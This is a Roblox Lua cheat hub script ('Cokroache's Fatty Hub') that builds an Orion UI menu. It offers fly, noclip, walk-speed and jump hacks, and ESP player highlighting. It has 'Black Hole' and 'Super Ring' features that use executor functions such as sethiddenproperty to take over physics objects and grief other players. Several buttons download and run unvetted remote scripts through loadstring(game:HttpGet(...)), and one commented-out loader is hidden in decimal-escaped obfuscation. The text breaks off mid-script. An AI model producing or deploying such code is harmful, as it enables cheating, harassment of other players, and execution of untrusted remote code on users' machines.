local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local noclip = false
local connection
local Plr = game.Players.LocalPlayer

local TextChatService = game:GetService("TextChatService")


local function notify(message)
	StarterGui:SetCore("SendNotification", {
		Title = "Notification";
		Text = message;
		Duration = 3;
	})
end


local player = game.Players.LocalPlayer

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

OrionLib:MakeNotification({
	Name = "Cokroache's Fatty Hub!",
	Content = "For the big fatties around the globe",
	Image = "rbxassetid://107642772703957",
	Time = 5
})




local Window = OrionLib:MakeWindow({Name = "Cokroache's Fatty Hub V1.532", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})








local Tab = Window:MakeTab({
	Name = "World",
	Icon = "rbxassetid://128146070832284",
	PremiumOnly = false
})

Tab:AddParagraph("Sky Settings","- World Adjustments ")

local Section = Tab:AddSection({
	Name = "Time"
})

Tab:AddButton({
	Name = "Day",
	Callback = function(Value)
		game.Lighting.TimeOfDay = "12:00:00"
	end 
})

Tab:AddButton({
	Name = "Night",
	Callback = function(Value)
		game.Lighting.TimeOfDay = "06:00:00"
	end 
})


local ctod = "0:00:00"

Tab:AddTextbox({
	Name = "Custom TimeOfDay",
	Default = "0",
	TextDisappear = true,
	Callback = function(Value)
		ctod = Value
		local function TOD()
			game.Lighting.TimeOfDay = ctod

		end
		TOD()
	end	  
})

Tab:AddLabel("---------------------------------------")


Tab:AddParagraph("Game Sounds","- World Adjustments ")

local Section = Tab:AddSection({
	Name = "Music"
})

local SoundId = nil


Tab:AddTextbox({
	Name = "Play Music ID",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		SoundId = Value
		m = Instance.new("Sound")
		m.Name = "Music"
		m.Parent = game.SoundService
		m.Playing = true
		m.Looped = true
		m.SoundId = SoundId
	end	  
})



local Section = Tab:AddSection({
	Name = "SkyBox"
})


local skyboxid = nil




Tab:AddButton({
	Name = "SkyBox",
	Callback = function(Value)
		--[[local dad = game.Lighting:WaitForChild("Sky")
		dad:destroy()]]
		local function skypoop()
			s = Instance.new("Sky")
			s.Name = "Sky"
			s.SkyboxBk = "http://www.roblox.com/asset/?id=" .. skyboxid
			print("http://www.roblox.com/asset/?id=" .. skyboxid)
			s.SkyboxDn =  "http://www.roblox.com/asset/?id=" .. skyboxid
			s.SkyboxFt =  "http://www.roblox.com/asset/?id=" .. skyboxid
			s.SkyboxLf =  "http://www.roblox.com/asset/?id=" .. skyboxid
			s.SkyboxRt =  "http://www.roblox.com/asset/?id=" .. skyboxid
			s.SkyboxUp =  "http://www.roblox.com/asset/?id=" .. skyboxid
			s.Parent = game.Lighting
		end 
		skypoop()
	end
})


Tab:AddTextbox({
	Name = "SkyBox ID",
	Default = "108595773556314",
	TextDisappear = true,
	Callback = function(Value)
		skyboxid = Value
	end	  
})



Tab:AddButton({
	Name = "RESET SETTINGS!",
	Callback = function()
		game.Lighting.TimeOfDay = "12:00:00"
		local sk = game.Lighting:FindFirstChild("Sky")
		sk:Destroy()
		local ms = game.SoundService:FindFirstChild("Sound")
		ms:Destroy()
	end    
})







local Tab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://128146070832284",
	PremiumOnly = false
})


Tab:AddParagraph("Player Settings","- Character Adjustments ")





local Section = Tab:AddSection({
	Name = "Character"
})



--[[Tab:AddButton({
	Name = "Fly",
	Callback = function(Value)
		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()	end    
})
]]

Tab:AddButton({
	Name = "Fly (F)",
	Callback = function(Value)

		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0

		function Fly()

			local bg = Instance.new("BodyGyro", torso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = torso.CFrame
			local bv = Instance.new("BodyVelocity", torso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			repeat wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+1+(speed/maxspeed)
					if speed > maxspeed then
						speed = maxspeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-1
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
			if key:lower() == "f" then
				if flying then flying = false
				else
					flying = true
					Fly()
				end
			elseif key:lower() == "w" then
				ctrl.f = 1
			elseif key:lower() == "s" then
				ctrl.b = -1
			elseif key:lower() == "a" then
				ctrl.l = -1
			elseif key:lower() == "d" then
				ctrl.r = 1
			end
		end)
		mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
			elseif key:lower() == "s" then
				ctrl.b = 0
			elseif key:lower() == "a" then
				ctrl.l = 0
			elseif key:lower() == "d" then
				ctrl.r = 0
			end
		end)
		Fly()
	end    
})


Tab:AddButton({
	Name = "Noclip (N)",
	Callback = function()

		local function toggleNoclip()
			noclip = not noclip
			if noclip then
				connection = RunService.Stepped:Connect(function()
					for _, part in pairs(player.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
				end)
			else
				if connection then
					connection:Disconnect()
				end
				for _, part in pairs(player.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.CanCollide = true
					end
				end
			end
		end

		Plr:GetMouse().KeyDown:Connect(function(n) -- Replace e with your key
			if n == "n" then --Replace e with your key 
				toggleNoclip()
			end
		end)
	end    
})


Tab:AddSlider({
	Name = "Walk Speed (Default:16-20)",
	Min = 0,
	Max = 240,
	Default = 16,
	Increment = 1,
	ValueName = "Speed",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end    
})
workspace.CurrentCamera.FieldOfView = 20 


Tab:AddSlider({
	Name = "Jump Power (Default:50)",
	Min = 0,
	Max = 350,
	Default = 50,
	Increment = 1,
	ValueName = "Power",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
		game.Players.LocalPlayer.Character:SetAttribute("CanJump", true)

	end    
})
Tab:AddLabel("---------------------------------------")

Tab:AddParagraph("Visuals","- Camera ")



local Section = Tab:AddSection({
	Name = "FOV"
})




Tab:AddSlider({
	Name = "FieldOfView (Default:70)",
	Min = 10,
	Max = 120,
	Default = 70,

	Increment = 1,
	ValueName = "FOV",
	Callback = function(Value)
		workspace.CurrentCamera.FieldOfView = Value

	end    
})




local Section = Tab:AddSection({
	Name = "CameraModes"
})




Tab:AddButton({
	Name = "First Person",
	Callback = function(Value)
		game.Players.LocalPlayer.CameraMinZoomDistance = 0
		game.Players.LocalPlayer.CameraMaxZoomDistance = 130
		game.Workspace.Camera.CameraType = "Custom"
		game.Players.LocalPlayer.CameraMode = "LockFirstPerson"

	end 
})


Tab:AddButton({
	Name = "Second Person",
	Callback = function(Value)
		game.Players.LocalPlayer.CameraMode = "Classic"
		game.Players.LocalPlayer.CameraMinZoomDistance = 0
		game.Players.LocalPlayer.CameraMaxZoomDistance = 130
		game.Workspace.Camera.CameraType = "Custom"
	end 
})


Tab:AddButton({
	Name = "Third Person",
	Callback = function(Value)
		game.Players.LocalPlayer.CameraMode = "Classic"
		game.Players.LocalPlayer.CameraMinZoomDistance = 6
		game.Players.LocalPlayer.CameraMaxZoomDistance = 6
		game.Workspace.Camera.CameraType = "Attach"
	end 
})


local Section = Tab:AddSection({
	Name = "ESP"
})




local EspColour = Color3.fromRGB(255, 255, 255)
local TextColour = Color3.fromRGB(0, 0, 0)



Tab:AddColorpicker({
	Name = "Esp Colour",
	Default = Color3.fromRGB(255, 255, 255),
	Callback = function(Value)
		EspColour = Value
	end	  
})


local FillTransparency = 0.5
local OutlineTransparency = 0


Tab:AddButton({
	Name = "ESP (BUGGY)",
	Callback = function(Value)
		local function esplook()
			local esp_settings = { ---- table for esp settings 
				textsize = 30,
				colour = TextColour
			}

			local gui = Instance.new("BillboardGui")
			local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel



			gui.Name = "Cracked esp"; ---- properties of the esp
			gui.ResetOnSpawn = false
			gui.AlwaysOnTop = true;
			gui.LightInfluence = 0;
			gui.Size = UDim2.new(1.75, 0, 1.75, 0);
			esp.BackgroundColor3 = esp_settings.colour;
			esp.Text = ""
			esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
			esp.BorderSizePixel = 4;
			esp.BorderColor3 =  esp_settings.colour
			esp.BorderSizePixel = 0
			esp.Font = "GothamSemibold"
			esp.TextSize = esp_settings.textsize
			esp.TextColor3 =  esp_settings.colour -- text colour

			game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
				for i,v in pairs (game:GetService("Players"):GetPlayers()) do
					if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
						esp.Text = "{"..v.Name.."}"
						gui:Clone().Parent = v.Character.Head
					end
				end
			end)
		end



		local FillColor = EspColour
		local DepthMode = "AlwaysOnTop"
		local OutlineColor = Color3.fromRGB(255,255,255)

		local CoreGui = game:FindService("CoreGui")
		local Players = game:FindService("Players")
		local lp = Players.LocalPlayer
		local connections = {}

		local Storage = Instance.new("Folder")
		Storage.Parent = CoreGui
		Storage.Name = "Highlight_Storage"

		local function Highlight(plr)
			local Highlight = Instance.new("Highlight")
			Highlight.Name = plr.Name
			Highlight.FillColor = FillColor
			Highlight.DepthMode = DepthMode
			Highlight.FillTransparency = FillTransparency
			Highlight.OutlineColor = OutlineColor
			Highlight.OutlineTransparency = 0
			Highlight.Parent = Storage

			local plrchar = plr.Character
			if plrchar then
				Highlight.Adornee = plrchar
			end

			connections[plr] = plr.CharacterAdded:Connect(function(char)
				Highlight.Adornee = char
			end)
		end

		Players.PlayerAdded:Connect(Highlight)
		for i,v in next, Players:GetPlayers() do
			Highlight(v)
		end

		Players.PlayerRemoving:Connect(function(plr)
			local plrname = plr.Name
			if Storage[plrname] then
				Storage[plrname]:Destroy()
			end
			if connections[plr] then
				connections[plr]:Disconnect()
			end
		end)
		esplook()
	end
})

local Section = Tab:AddSection({
	Name = "Settings"
})




Tab:AddButton({
	Name = "RESET SETTINGS!",
	Callback = function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		game.Workspace.Camera.FieldOfView = 70
		game.Players.LocalPlayer.CameraMode = "Classic"
		game.Players.LocalPlayer.CameraMinZoomDistance = 0
		game.Players.LocalPlayer.CameraMaxZoomDistance = 130
		game.Workspace.Camera.CameraType = "Custom"

	end    
})



local Tab = Window:MakeTab({
	Name = "Universal Hubs",
	Icon = "rbxassetid://107642772703957",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Infinite Yield"
})


Tab:AddButton({
	Name = "Inf Yield",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()

	end    
})



local Section = Tab:AddSection({
	Name = "Ghost Hub"
})


Tab:AddButton({
	Name = "Ghost Player",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
	end    
})


local Section = Tab:AddSection({
	Name = "MSPaint"
})


local unitpoopa = nil



Tab:AddButton({
	Name = "Ms Paint",
	Callback = function()

		script_key=unitpoopa;
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
	end    
})

local Section = Tab:AddSection({
	Name = "SkyHub (FE)"
})

Tab:AddButton({
	Name = "Sky Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
	end    
})

Tab:AddTextbox({
	Name = "Enter Key",
	Default = "key",
	TextDisappear = true,
	Callback = function(Value)
		unitpoopa = Value
	end	  
})


Tab:AddButton({
	Name = "Get Key (CHECK CONSOLE FOR LINK)",
	Callback = function()
		print("https://ads.luarmor.net/get_key?for=-rXJfopyAkrky")
	end    
})



local Tab = Window:MakeTab({
	Name = "> Hubs",
	Icon = "rbxassetid://107642772703957",
	PremiumOnly = false
})


Tab:AddParagraph("MSPAINT SUGGESTED!","- Universal Hub")


local Section = Tab:AddSection({
	Name = "Natural Disasters"
})


Tab:AddButton({
	Name = "Black Hole",
	Callback = function()
		--orbit
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local LocalPlayer = Players.LocalPlayer
		local Workspace = game:GetService("Workspace")

		local angle = 1
		local radius = 10
		local blackHoleActive = false

		local function setupPlayer()
			local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

			local Folder = Instance.new("Folder", Workspace)
			local Part = Instance.new("Part", Folder)
			local Attachment1 = Instance.new("Attachment", Part)
			Part.Anchored = true
			Part.CanCollide = false
			Part.Transparency = 1

			return humanoidRootPart, Attachment1
		end

		local humanoidRootPart, Attachment1 = setupPlayer()

		if not getgenv().Network then
			getgenv().Network = {
				BaseParts = {},
				Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
			}

			Network.RetainPart = function(part)
				if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
					table.insert(Network.BaseParts, part)
					part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
					part.CanCollide = false
				end
			end

			local function EnablePartControl()
				LocalPlayer.ReplicationFocus = Workspace
				RunService.Heartbeat:Connect(function()
					sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
					for _, part in pairs(Network.BaseParts) do
						if part:IsDescendantOf(Workspace) then
							part.Velocity = Network.Velocity
						end
					end
				end)
			end

			EnablePartControl()
		end

		local function ForcePart(v)
			if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
				for _, x in next, v:GetChildren() do
					if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
						x:Destroy()
					end
				end
				if v:FindFirstChild("Attachment") then
					v:FindFirstChild("Attachment"):Destroy()
				end
				if v:FindFirstChild("AlignPosition") then
					v:FindFirstChild("AlignPosition"):Destroy()
				end
				if v:FindFirstChild("Torque") then
					v:FindFirstChild("Torque"):Destroy()
				end
				v.CanCollide = false

				local Torque = Instance.new("Torque", v)
				Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
				local AlignPosition = Instance.new("AlignPosition", v)
				local Attachment2 = Instance.new("Attachment", v)
				Torque.Attachment0 = Attachment2
				AlignPosition.MaxForce = math.huge
				AlignPosition.MaxVelocity = math.huge
				AlignPosition.Responsiveness = 500
				AlignPosition.Attachment0 = Attachment2
				AlignPosition.Attachment1 = Attachment1
			end
		end

		local function toggleBlackHole()
			blackHoleActive = not blackHoleActive
			if blackHoleActive then
				for _, v in next, Workspace:GetDescendants() do
					ForcePart(v)
				end

				Workspace.DescendantAdded:Connect(function(v)
					if blackHoleActive then
						ForcePart(v)
					end
				end)

				spawn(function()
					while blackHoleActive and RunService.RenderStepped:Wait() do
						angle = angle + math.rad(2)

						local offsetX = math.cos(angle) * radius
						local offsetZ = math.sin(angle) * radius

						Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
					end
				end)
			else
				Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
			end
		end

		LocalPlayer.CharacterAdded:Connect(function()
			humanoidRootPart, Attachment1 = setupPlayer()
			if blackHoleActive then
				toggleBlackHole()
			end
		end)

		local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
		local window = library:Window("Projeto LKB")

		window:Slider("Radius Blackhole",1,100,10, function(Value)
			radius = Value
		end)

		window:Toggle("Blackhole", true, function(Value)
			if Value then
				toggleBlackHole()
			else
				blackHoleActive = false
			end
		end)

		spawn(function()
			while true do
				RunService.RenderStepped:Wait()
				if blackHoleActive then
					angle = angle + math.rad(angleSpeed)
				end
			end
		end)

		toggleBlackHole()
	end    
})

Tab:AddButton({
	Name = "Super Ring",
	Callback = function()
		--supper ring
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local SoundService = game:GetService("SoundService")
		local StarterGui = game:GetService("StarterGui")
		local TextChatService = game:GetService("TextChatService")

		local LocalPlayer = Players.LocalPlayer

		-- Sound Effects
		local function playSound(soundId)
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. soundId
			sound.Parent = SoundService
			sound:Play()
			sound.Ended:Connect(function()
				sound:Destroy()
			end)
		end

		-- Play initial sound
		playSound("2865227271")

		-- GUI Creation
		local ScreenGui = Instance.new("ScreenGui")
		ScreenGui.Name = "SuperRingPartsGUI"
		ScreenGui.ResetOnSpawn = false
		ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

		local MainFrame = Instance.new("Frame")
		MainFrame.Size = UDim2.new(0, 220, 0, 190)
		MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
		MainFrame.BackgroundColor3 = Color3.fromRGB(205, 170, 125) -- Light brown
		MainFrame.BorderSizePixel = 0
		MainFrame.Parent = ScreenGui

		-- Make the GUI round
		local UICorner = Instance.new("UICorner")
		UICorner.CornerRadius = UDim.new(0, 20)
		UICorner.Parent = MainFrame

		local Title = Instance.new("TextLabel")
		Title.Size = UDim2.new(1, 0, 0, 40)
		Title.Position = UDim2.new(0, 0, 0, 0)
		Title.Text = "Super Ring Parts v3"
		Title.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
		Title.BackgroundColor3 = Color3.fromRGB(222, 184, 135) -- Lighter brown
		Title.Font = Enum.Font.Fondamento -- More elegant font
		Title.TextSize = 22
		Title.Parent = MainFrame

		-- Round the title
		local TitleCorner = Instance.new("UICorner")
		TitleCorner.CornerRadius = UDim.new(0, 20)
		TitleCorner.Parent = Title

		local ToggleButton = Instance.new("TextButton")
		ToggleButton.Size = UDim2.new(0.8, 0, 0, 35)
		ToggleButton.Position = UDim2.new(0.1, 0, 0.3, 0)
		ToggleButton.Text = "Ring Parts Off"
		ToggleButton.BackgroundColor3 = Color3.fromRGB(160, 82, 45) -- Sienna
		ToggleButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
		ToggleButton.Font = Enum.Font.Fondamento
		ToggleButton.TextSize = 18
		ToggleButton.Parent = MainFrame

		-- Round the toggle button
		local ToggleCorner = Instance.new("UICorner")
		ToggleCorner.CornerRadius = UDim.new(0, 10)
		ToggleCorner.Parent = ToggleButton

		local DecreaseRadius = Instance.new("TextButton")
		DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
		DecreaseRadius.Position = UDim2.new(0.1, 0, 0.6, 0)
		DecreaseRadius.Text = "<"
		DecreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
		DecreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
		DecreaseRadius.Font = Enum.Font.Fondamento
		DecreaseRadius.TextSize = 18
		DecreaseRadius.Parent = MainFrame

		-- Round the decrease button
		local DecreaseCorner = Instance.new("UICorner")
		DecreaseCorner.CornerRadius = UDim.new(0, 10)
		DecreaseCorner.Parent = DecreaseRadius

		local IncreaseRadius = Instance.new("TextButton")
		IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
		IncreaseRadius.Position = UDim2.new(0.7, 0, 0.6, 0)
		IncreaseRadius.Text = ">"
		IncreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
		IncreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
		IncreaseRadius.Font = Enum.Font.Fondamento
		IncreaseRadius.TextSize = 18
		IncreaseRadius.Parent = MainFrame

		-- Round the increase button
		local IncreaseCorner = Instance.new("UICorner")
		IncreaseCorner.CornerRadius = UDim.new(0, 10)
		IncreaseCorner.Parent = IncreaseRadius

		local RadiusDisplay = Instance.new("TextLabel")
		RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 35)
		RadiusDisplay.Position = UDim2.new(0.3, 0, 0.6, 0)
		RadiusDisplay.Text = "Radius: 50"
		RadiusDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
		RadiusDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
		RadiusDisplay.Font = Enum.Font.Fondamento
		RadiusDisplay.TextSize = 18
		RadiusDisplay.Parent = MainFrame

		-- Round the radius display
		local RadiusCorner = Instance.new("UICorner")
		RadiusCorner.CornerRadius = UDim.new(0, 10)
		RadiusCorner.Parent = RadiusDisplay

		local Watermark = Instance.new("TextLabel")
		Watermark.Size = UDim2.new(1, 0, 0, 20)
		Watermark.Position = UDim2.new(0, 0, 1, -20)
		Watermark.Text = "Super Ring [V3] - Cracked By Projeto LKB"
		Watermark.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
		Watermark.BackgroundTransparency = 1
		Watermark.Font = Enum.Font.Fondamento
		Watermark.TextSize = 14
		Watermark.Parent = MainFrame

		-- Add minimize button
		local MinimizeButton = Instance.new("TextButton")
		MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
		MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
		MinimizeButton.Text = "-"
		MinimizeButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
		MinimizeButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
		MinimizeButton.Font = Enum.Font.Fondamento
		MinimizeButton.TextSize = 18
		MinimizeButton.Parent = MainFrame

		-- Round the minimize button
		local MinimizeCorner = Instance.new("UICorner")
		MinimizeCorner.CornerRadius = UDim.new(0, 15)
		MinimizeCorner.Parent = MinimizeButton

		-- Minimize functionality
		local minimized = false
		MinimizeButton.MouseButton1Click:Connect(function()
			minimized = not minimized
			if minimized then
				MainFrame:TweenSize(UDim2.new(0, 220, 0, 40), "Out", "Quad", 0.3, true)
				MinimizeButton.Text = "+"
				ToggleButton.Visible = false
				DecreaseRadius.Visible = false
				IncreaseRadius.Visible = false
				RadiusDisplay.Visible = false
				Watermark.Visible = false
			else
				MainFrame:TweenSize(UDim2.new(0, 220, 0, 190), "Out", "Quad", 0.3, true)
				MinimizeButton.Text = "-"
				ToggleButton.Visible = true
				DecreaseRadius.Visible = true
				IncreaseRadius.Visible = true
				RadiusDisplay.Visible = true
				Watermark.Visible = true
			end
			playSound("12221967")
		end)

		-- Make GUI draggable
		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		MainFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = MainFrame.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		MainFrame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)

		-- Ring Parts Logic
		if not getgenv().Network then
			getgenv().Network = {
				BaseParts = {},
				Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
			}
			Network.RetainPart = function(Part)
				if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
					table.insert(Network.BaseParts, Part)
					Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
					Part.CanCollide = false
				end
			end
			local function EnablePartControl()
				LocalPlayer.ReplicationFocus = workspace
				RunService.Heartbeat:Connect(function()
					sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
					for _, Part in pairs(Network.BaseParts) do
						if Part:IsDescendantOf(workspace) then
							Part.Velocity = Network.Velocity
						end
					end
				end)
			end
			EnablePartControl()
		end

		local radius = 50
		local height = 100
		local rotationSpeed = 10
		local attractionStrength = 1000
		local ringPartsEnabled = false

		local function RetainPart(Part)
			if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(workspace) then
				if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
					return false
				end

				Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
				Part.CanCollide = false
				return true
			end
			return false
		end

		local parts = {}
		local function addPart(part)
			if RetainPart(part) then
				if not table.find(parts, part) then
					table.insert(parts, part)
				end
			end
		end

		local function removePart(part)
			local index = table.find(parts, part)
			if index then
				table.remove(parts, index)
			end
		end

		for _, part in pairs(workspace:GetDescendants()) do
			addPart(part)
		end

		workspace.DescendantAdded:Connect(addPart)
		workspace.DescendantRemoving:Connect(removePart)

		RunService.Heartbeat:Connect(function()
			if not ringPartsEnabled then return end

			local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				local tornadoCenter = humanoidRootPart.Position
				for _, part in pairs(parts) do
					if part.Parent and not part.Anchored then
						local pos = part.Position
						local distance = (Vector3.new(pos.X, tornadoCenter.Y, pos.Z) - tornadoCenter).Magnitude
						local angle = math.atan2(pos.Z - tornadoCenter.Z, pos.X - tornadoCenter.X)
						local newAngle = angle + math.rad(rotationSpeed)
						local targetPos = Vector3.new(
							tornadoCenter.X + math.cos(newAngle) * math.min(radius, distance),
							tornadoCenter.Y + (height * (math.abs(math.sin((pos.Y - tornadoCenter.Y) / height)))),
							tornadoCenter.Z + math.sin(newAngle) * math.min(radius, distance)
						)
						local directionToTarget = (targetPos - part.Position).unit
						part.Velocity = directionToTarget * attractionStrength
					end
				end
			end
		end)

		-- Button functionality
		ToggleButton.MouseButton1Click:Connect(function()
			ringPartsEnabled = not ringPartsEnabled
			ToggleButton.Text = ringPartsEnabled and "Ring Parts On" or "Ring Parts Off"
			ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
			playSound("12221967")
		end)

		DecreaseRadius.MouseButton1Click:Connect(function()
			radius = math.max(10, radius - 5)
			RadiusDisplay.Text = "Radius: " .. radius
			playSound("12221967")
		end)

		IncreaseRadius.MouseButton1Click:Connect(function()
			radius = math.min(100, radius + 5)
			RadiusDisplay.Text = "Radius: " .. radius
			playSound("12221967")
		end)


		-- Get player thumbnail
